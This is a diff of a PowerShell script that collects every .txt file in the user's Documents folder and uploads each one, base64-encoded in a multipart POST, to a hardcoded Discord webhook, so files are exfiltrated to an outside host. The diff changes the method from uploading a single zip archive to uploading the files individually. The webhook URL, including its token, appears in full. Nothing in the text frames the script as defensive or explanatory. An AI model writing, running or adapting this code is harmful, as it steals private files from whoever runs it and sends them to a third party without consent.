@@ -1,56 +1,45 @@
 # Path to the documents folder
 $documentsPath = "$env:USERPROFILE\Documents"
-# Path to the zip file
-$zipFilePath = "$documentsPath\txt_files.zip"
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 
-# Remove any existing zip file
-if (Test-Path $zipFilePath) {
-    Remove-Item $zipFilePath -Force
+# Get all .txt files in the documents folder
+$txtFiles = Get-ChildItem -Path $documentsPath -Filter *.txt
+
+foreach ($file in $txtFiles) {
+    $filePath = $file.FullName
+    $fileName = $file.Name
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+
+    # Create multipart/form-data content
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $bodyLines = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.Convert]::ToBase64String($fileBytes),
+        "--$boundary--"
+    )
+    $body = $bodyLines -join $LF
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+
+    # Send the request
+    $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
+    $webRequest.Method = "POST"
+    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
+    $webRequest.ContentLength = $bytes.Length
+    $webRequestStream = $webRequest.GetRequestStream()
+    $webRequestStream.Write($bytes, 0, $bytes.Length)
+    $webRequestStream.Close()
+
+    # Get the response from the server
+    $webResponse = $webRequest.GetResponse()
+    $webResponseStream = $webResponse.GetResponseStream()
+    $reader = New-Object System.IO.StreamReader($webResponseStream)
+    $responseContent = $reader.ReadToEnd()
+    $reader.Close()
+    $webResponseStream.Close()
+    $webResponse.Close()
 }
-
-# Compress all .txt files into a zip file
-Get-ChildItem -Path $documentsPath -Filter *.txt | Compress-Archive -DestinationPath $zipFilePath -Force
-
-# Check if the zip file was created
-if (-Not (Test-Path $zipFilePath)) {
-    Write-Error "Zip file was not created."
-    exit 1
-}
-
-# Prepare the file for upload
-$fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
-$fileName = [System.IO.Path]::GetFileName($zipFilePath)
-
-# Create multipart/form-data content
-$boundary = [System.Guid]::NewGuid().ToString()
-$LF = "`r`n"
-$bodyLines = @(
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-    "Content-Type: application/octet-stream",
-    "",
-    [System.Convert]::ToBase64String($fileBytes),
-    "--$boundary--"
-)
-$body = $bodyLines -join $LF
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-
-# Send the request
-$webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
-$webRequest.Method = "POST"
-$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
-$webRequest.ContentLength = $bytes.Length
-$webRequestStream = $webRequest.GetRequestStream()
-$webRequestStream.Write($bytes, 0, $bytes.Length)
-$webRequestStream.Close()
-
-# Get the response from the server
-$webResponse = $webRequest.GetResponse()
-$webResponseStream = $webResponse.GetResponseStream()
-$reader = New-Object System.IO.StreamReader($webResponseStream)
-$responseContent = $reader.ReadToEnd()
-$reader.Close()
-$webResponseStream.Close()
-$webResponse.Close()
